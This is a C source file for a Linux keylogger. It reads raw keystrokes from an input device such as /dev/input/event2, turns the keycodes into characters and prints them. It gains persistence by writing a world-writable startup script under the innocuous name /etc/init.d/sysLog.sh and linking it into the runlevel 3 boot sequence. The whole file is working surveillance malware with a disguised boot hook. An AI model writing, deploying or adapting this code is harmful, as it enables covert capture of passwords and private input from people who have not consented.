#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int createStartupBash(int numArgs, char* directory) {
    FILE *fp = fopen("/etc/init.d/sysLog.sh", "w+");
    FILE *bash = popen("/bin/pwd /etc/", "r");
    char mode[] = "0777";
    char buf[]="/etc/init.d/sysLog.sh";
    int i = strtol(mode, 0, 8);
    char* pathFin;
    char path [1035];
    if (numArgs < 3) {
        if (bash == NULL) {
            printf ("Failed to run command\n");
            return 1;
        }

        fgets(path, sizeof(path)-1, bash);
        pathFin = path;
    } else {
        pathFin = directory;
    }
    fprintf(fp, "#!/bin/sh\n");
    fprintf(fp, "PATH=%s\n", pathFin);
    fprintf(fp, "${PATH}/log /dev/input/event2 ${PATH}");
    
    pclose(bash);
    fclose(fp);
    if (chmod(buf,i)<0)
        printf("error in chmod");
    if (symlink("../init.d/sysLog.sh", "/etc/rc3.d/S05sysLog")<0)
        printf("error in ln");
    return 0;
}

int main(int argc, char **argv)
{
	FILE *check = fopen("check.txt","w");
	fclose(check);
    int fd;
     char values[111]={' ','^','1','2', '3','4','5','6','7','8','9', '0','-','=',' ',' ','q','w','e','r','t','y','u','i','o','p','[',']',' ',' ','a','s','d','f','g','h','j','k','l',';','\'','~',' ','\\','z','x','c','v','b','n','m', ',', '.', '/',' ','*',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ','7','8','9','-','4','5','6','+','1','2','3','0','.'};

    createStartupBash(argc, argv[2]);
    if(argc < 2) {
        printf("usage: %s <device>\n", argv[0]);
        return 1;
    }
    fd = open(argv[1], O_RDONLY);
    struct input_event ev;

    while (1)
    {
    read(fd, &ev, sizeof(struct input_event));

if(ev.type == 1&&ev.value==1){
	
	if(ev.code<=83&&ev.code!=56&&ev.code!=15&&ev.code!=28&&ev.code!=58&&ev.code!=42&&ev.code!=54&&ev.code!=29&&ev.code!=14&&ev.code!=69)
	 printf("%c", values[ev.code]);

	else if(ev.code == 105)
        printf(" LeftArrow ");
	else if(ev.code == 108)
        printf(" DownArrow ");
	else if(ev.code == 106)
        printf(" RightArrow ");
	else if(ev.code == 103)
        printf(" UpArrow ");
	else if(ev.code == 56)
        printf(" Alt ");
	else if(ev.code == 15)
        printf(" Tab ");
	else if(ev.code == 28||ev.code==96)
        printf("\n");
	else if(ev.code == 58)
        printf(" CapsLock ");
	else if(ev.code == 42||ev.code==54)
        printf(" Shift ");
	else if(ev.code == 29)
        printf(" Ctrl ");
	else if(ev.code == 14)
        printf(" Backspace ");
	else if(ev.code == 111)
        printf(" Delete ");
	else if(ev.code == 69)
        printf(" NUMLOCK ");

	fflush(stdout);
	}

    }
}
